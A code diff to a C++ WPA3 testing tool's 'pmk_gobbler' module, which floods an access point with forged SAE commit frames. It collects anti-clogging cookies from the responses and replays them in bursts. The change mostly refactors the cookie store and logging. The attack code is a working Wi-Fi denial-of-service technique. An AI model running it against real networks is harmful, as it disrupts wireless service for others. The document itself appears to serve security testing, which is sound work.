@@ -18,7 +18,6 @@ using namespace chrono;
 
 namespace wpa3_tester::pmk_gobbler {
 
-    // TODO use sae_params? (if not needed , maybe is more readable like thath)
     static RadioTap make_sae_commit(const HWAddress<6> &ap_mac,
                                     const HWAddress<6> &sta_mac,
                                     dos_helpers::SAEPair sae_params) {
@@ -47,11 +46,11 @@ namespace wpa3_tester::pmk_gobbler {
     }
 
     //TODO add test
-    optional<ACMCookie> parse_acm_response(const uint8_t *packet, const uint32_t len) {
+    optional<ACMCookie> parse_acm_response(const uint8_t *packet, uint32_t len) {
         const auto sae = dos_helpers::parse_sae_commit(packet, len);
         if (!sae) return nullopt;
         const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet + 2);
-        if (len < (radiotap_len + 10)) return nullopt;
+        if (len < static_cast<uint32_t>(radiotap_len + 10)) return nullopt;
 
         ACMCookie entry;
         entry.sta_mac = HWAddress<6>(packet + radiotap_len + 4); // addr1 = destination STA
@@ -94,23 +93,20 @@ namespace wpa3_tester::pmk_gobbler {
             const uint8_t *packet;
             while (pcap_next_ex(handle, &header, &packet) == 1) {
                 if (auto entry = parse_acm_response(packet, header->caplen)) {
-                    size_t q_size;
-                    {
-                        lock_guard lock(store.mtx);
-                        store.queue.push_back(*entry);
-                        q_size = store.queue.size();
+                    lock_guard lock(store.mtx);
+                    const auto [it, inserted] = store.queue.insert_or_assign(
+                        entry->sta_mac.to_string(), *entry);
+                    if (inserted) {
+                        log(LogLevel::DEBUG, "Cookie captured for %s, queue size %d",
+                            entry->sta_mac.to_string().c_str(), store.queue.size());
                     }
-                    log(LogLevel::DEBUG, "Cookie captured for "
-                        + entry->sta_mac.to_string()
-                        + ", queue size: " + to_string(q_size));
                 }
             }
         }
-
         log(LogLevel::INFO, "Cookie capture stopped");
     }
 
-    ACMCookie trigger_acm(const string &iface, const string &sniff_iface,
+    ACMCookie trigger_acm(const string &iface,
                       const HWAddress<6> &ap_mac, const int trigger_count, dos_helpers::SAEPair sae_params) {
         PacketSender sender(iface);
 
@@ -132,7 +128,7 @@ namespace wpa3_tester::pmk_gobbler {
         if (fd == -1) throw runtime_error("pcap fd not selectable");
         pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
 
-        log(LogLevel::INFO, "Triggering ACM (max " + to_string(trigger_count) + " frames)...");
+        log(LogLevel::INFO, "Triggering ACM (max %d frames)...", trigger_count);
         for (int i = 0; i < trigger_count; ++i) {
             auto frame = make_sae_commit(ap_mac, HWAddress<6>(hw_capabilities::rand_mac()), sae_params);
             sender.send(frame);
@@ -169,7 +165,7 @@ namespace wpa3_tester::pmk_gobbler {
         long long next_log = 500;
         const auto end_time = steady_clock::now() + seconds(attack_time_sec);
 
-        log(LogLevel::INFO, "Burst phase started, duration: "+to_string(attack_time_sec) +"s");
+        log(LogLevel::INFO, "Burst phase started, duration: %ds", attack_time_sec);
 
         while (steady_clock::now() < end_time) {
             ACMCookie entry;
@@ -179,15 +175,16 @@ namespace wpa3_tester::pmk_gobbler {
                     this_thread::sleep_for(milliseconds(10));
                     continue;
                 }
-                entry = std::move(store.queue.front());
-                store.queue.pop_front();
+                const auto it = store.queue.begin();
+                entry = std::move(it->second);
+                store.queue.erase(it);
             }
 
             auto new_sae_params = sae_params;
             new_sae_params.token = entry.token;
             auto frame = make_sae_commit(ap_mac, entry.sta_mac, new_sae_params);
 
-            constexpr size_t BURST_SIZE = 128;
+            constexpr size_t BURST_SIZE = 64;
             for (size_t i = 0; i < BURST_SIZE; ++i) {
                 sender.send(frame);
                 this_thread::sleep_for(nanoseconds(100));
@@ -230,9 +227,7 @@ namespace wpa3_tester::pmk_gobbler {
         attacker->up_iface();
 
         //  force AP into ACM mode
-        ACMCookie first = trigger_acm(iface, sniff_iface, ap_mac, trigger_count, sae_params);
-        this_thread::sleep_for(milliseconds(500)); // let AP activate ACM
-        //TODO check
+        ACMCookie first = trigger_acm(iface, ap_mac, trigger_count, sae_params);
         rs.start_observers();
         CookieStore store;
         thread capture_thread([&]() {
